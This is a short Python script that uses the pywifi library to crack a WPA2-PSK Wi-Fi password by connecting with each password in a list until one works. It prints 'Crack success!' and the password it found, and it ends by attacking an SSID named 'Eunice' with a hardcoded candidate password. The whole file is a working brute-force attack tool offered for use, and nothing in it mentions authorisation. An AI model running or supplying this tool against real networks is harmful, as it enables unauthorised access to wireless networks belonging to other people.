import time

import pywifi
from pywifi import Profile
from pywifi import PyWiFi
from pywifi import const
RED = "\033[1;31m"
BLUE = "\033[1;34m"
CYAN = "\033[1;36m"
GREEN = "\033[0;32m"
RESET = "\033[0;0m"
BOLD = "\033[;1m"
REVERSE = "\033[;7m"
try:
    # Interface information
    wifi = PyWiFi()
    ifaces = wifi.interfaces()[0]  # for wifi we use index - 0

    ifaces.scan()  # check the card
    results = ifaces.scan_results()  # Obtain the results of the previous triggerred scan. A Profile list will be
    # returned.

    wifi = pywifi.PyWiFi()  # A Profile is the settings of the AP we want to connect to
    iface = wifi.interfaces()[0]

except:
    print("[-] Error system")

type = False


def main(ssid, password, number=1):
    profile = Profile()  # create profile instance
    profile.ssid = ssid  # name of client
    profile.auth = const.AUTH_ALG_OPEN  # auth algo
    profile.akm.append(const.AKM_TYPE_WPA2PSK)  # key management
    profile.cipher = const.CIPHER_TYPE_CCMP  # type of cipher
    print(ssid)
    for i in password:
        print("p", i)
        profile.key = i  # use generated password
        iface.remove_all_network_profiles()  # remove all the profiles which are previously connected to device
        tmp_profile = iface.add_network_profile(profile)  # add new profile
        time.sleep(0.1)  # if script not working change time to 1 !!!!!!
        iface.connect(tmp_profile)  # trying to Connect
        time.sleep(0.35)  # 1s
        if ifaces.status() == const.IFACE_CONNECTED:  # checker
            time.sleep(1)
            print(BOLD, GREEN, '[*] Crack success!', RESET)
            print(BOLD, GREEN, '[*] password is ' + i, RESET)
            time.sleep(1)
            exit()
        else:
            print(RED, '[] Crack Failed using {}'.format(i))


main("Eunice", ["bcts8551"])
